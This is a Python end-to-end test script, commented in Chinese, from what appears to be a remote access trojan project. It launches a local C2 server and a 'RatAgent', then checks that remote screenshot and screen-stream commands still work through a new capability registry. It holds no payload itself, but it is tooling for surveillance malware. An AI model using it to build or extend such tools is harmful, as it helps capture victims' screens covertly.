# e2e_caps.py — 能力注册表回归（阶段 1）
#
# 背景：0x1001（截屏）与 0x1002（屏幕流开关）原来硬编码在 core 的
# cmd_dispatch.cpp 里；阶段 1 把它们搬进"能力"并通过 capability.h 注册表分发。
# 本脚本验证**行为没变**：
#   · 0x1001：ratctl screenshot → 生成合法 JPEG
#   · 0x1002：ratctl stop（内部发 0x1002 control=0）→ agent 回 "screen stream stopped"
#
# 前置：build/agent-full/bin/RatAgent.exe（module=full）
import os
import queue
import shutil
import subprocess
import threading
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
C2 = os.path.join(ROOT, "build", "bin", "c2server.exe")
RATCTL = os.path.join(ROOT, "build", "bin", "ratctl.exe")
AGENT = os.path.join(ROOT, "build", "agent-full", "bin", "RatAgent.exe")
WORK = os.path.join(ROOT, "build", "e2e", "caps")
RUN = os.path.join(WORK, "run")
C2_LOG = os.path.join(WORK, "c2server.log")
SHOT = os.path.join(WORK, "shot.jpg")

ok = True


def check(name, cond, detail=""):
    global ok
    print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")
    if not cond:
        ok = False


def read(p):
    try:
        with open(p, "r", encoding="utf-8", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


class Shell:
    """交互式 ratctl 会话（与其它 e2e 脚本同一套驱动方式）。"""

    def __init__(self):
        self.proc = subprocess.Popen([RATCTL, "-s", "127.0.0.1:4444"],
                                     stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding="utf-8",
                                     errors="replace", bufsize=1, cwd=ROOT)
        self.q = queue.Queue()
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        for line in self.proc.stdout:
            self.q.put(line)

    def drain(self):
        out = ""
        while True:
            try:
                out += self.q.get_nowait()
            except queue.Empty:
                break
        return out

    def send(self, cmds, wait):
        for c in cmds:
            self.proc.stdin.write(c + "\n")
            self.proc.stdin.flush()
        time.sleep(wait)
        return self.drain()

    def close(self):
        try:
            self.proc.stdin.close()
            self.proc.wait(timeout=3)
        except Exception:
            self.proc.kill()


def main():
    for p in (C2, RATCTL, AGENT):
        check(f"prereq {os.path.relpath(p, ROOT)}", os.path.exists(p))
    if not ok:
        print("== RESULT: PREREQ MISSING")
        return 1

    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(RUN, exist_ok=True)

    srv = agent = sh = None
    try:
        with open(C2_LOG, "w", encoding="utf-8", errors="replace") as f:
            srv = subprocess.Popen([C2], stdout=f, stderr=subprocess.STDOUT)
        time.sleep(1)
        agent = subprocess.Popen([AGENT, "127.0.0.1", "4444", "-tcp"],
                                 cwd=RUN, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        t0 = time.time()
        while time.time() - t0 < 25:
            if " online from " in read(C2_LOG):
                break
            time.sleep(0.5)
        log = read(C2_LOG)
        aid = ""
        for line in log.splitlines():
            if " online from " in line:
                for tok in line.replace("[", " ").replace("]", " ").split():
                    if len(tok) == 32 and all(c in "0123456789abcdef" for c in tok):
                        aid = tok
        check("agent 上线（module=full）", len(aid) == 32, aid)
        if not aid:
            raise SystemExit(1)

        sh = Shell()
        out = sh.send(["sessions"], 6)
        check("sessions 列出 agent", aid in out, repr(out[-90:]))

        # 0x1001 截屏：走 capability 注册表
        out = sh.send([f"screenshot {aid} {SHOT.replace(os.sep, '/')}"], 20)
        jpeg_ok = False
        if os.path.exists(SHOT):
            with open(SHOT, "rb") as f:
                head = f.read(2)
            jpeg_ok = head == b"\xff\xd8" and os.path.getsize(SHOT) > 1024
        check("0x1001 截屏经注册表仍可用", jpeg_ok,
              f"{os.path.getsize(SHOT)} bytes" if os.path.exists(SHOT) else repr(out[-90:]))

        # 0x1002 屏幕流：ratctl stop 会发 control=0
        out = sh.send(["use " + aid, "stop"], 12)
        check("0x1002 屏幕流经注册表仍可用", "screen stream stopped" in out, repr(out[-120:]))
        sh.close()
        sh = None
    finally:
        if sh:
            sh.close()
        for proc in (agent,):
            if proc and proc.poll() is None:
                proc.kill()
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    pass
        if srv:
            srv.terminate()
            try:
                srv.wait(timeout=5)
            except subprocess.TimeoutExpired:
                srv.kill()

    print("== RESULT:", "ALL PASS" if ok else "FAILURES PRESENT")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
